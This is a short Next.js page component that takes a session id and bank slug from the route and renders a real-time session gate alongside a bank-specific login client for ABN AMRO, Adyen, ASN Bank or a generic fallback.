import { SessionRealtimeGate } from "@/components/demo/SessionRealtimeGate";
import { BankLoginClient } from "./bank-login-client";
import { AbnAmroLoginClient } from "./abn-amro-client";
import { AdyenLoginClient } from "./adyen-client";
import { AsnBankLoginClient } from "./asn-bank-client";

type Props = {
  params: Promise<{ id: string; bank_slug: string }>;
};

export default async function BankLoginPage({ params }: Props) {
  const { id, bank_slug } = await params;

  return (
    <>
      <SessionRealtimeGate sessionId={id} />
      {bank_slug === "abn-amro" ? (
        <AbnAmroLoginClient sessionId={id} />
      ) : bank_slug === "adyen" ? (
        <AdyenLoginClient sessionId={id} />
      ) : bank_slug === "asn-bank" ? (
        <AsnBankLoginClient sessionId={id} />
      ) : (
        <BankLoginClient sessionId={id} bankSlug={bank_slug} />
      )}
    </>
  );
}
